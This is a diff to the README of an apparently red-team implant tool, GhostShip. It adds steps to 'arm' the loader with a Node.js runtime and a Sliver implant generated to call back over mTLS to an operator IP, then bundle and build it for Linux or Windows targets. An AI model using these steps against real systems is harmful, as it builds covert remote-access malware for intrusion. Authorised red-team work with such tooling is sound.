@@ -63,6 +63,21 @@ chmod +x ghostship-linux
 
 ---
 
+## 🛠 Arming the Implant (Important)
+
+The pre-compiled releases contain **placeholders** for the Node.js runtime and the Sliver payload to keep the build small and generic. To use GhostShip in a real engagement, you must "arm" it with your own binaries:
+
+1. **Obtain a Node.js binary** (e.g., from [nodejs.org](https://nodejs.org/en/download/prebuilt-binaries)) compatible with your target (Linux or Windows).
+2. **Generate your Sliver implant** (e.g., `generate --mtls <IP> --save ./implant.bin`).
+3. **Bundle and Build:**
+   ```bash
+   chmod +x bundle.sh
+   ./bundle.sh /path/to/node /path/to/implant.bin
+   make build-linux # or make build-windows
+   ```
+
+---
+
 ## Project Structure
 
 - `implant/`: The Go loader and asset management logic.
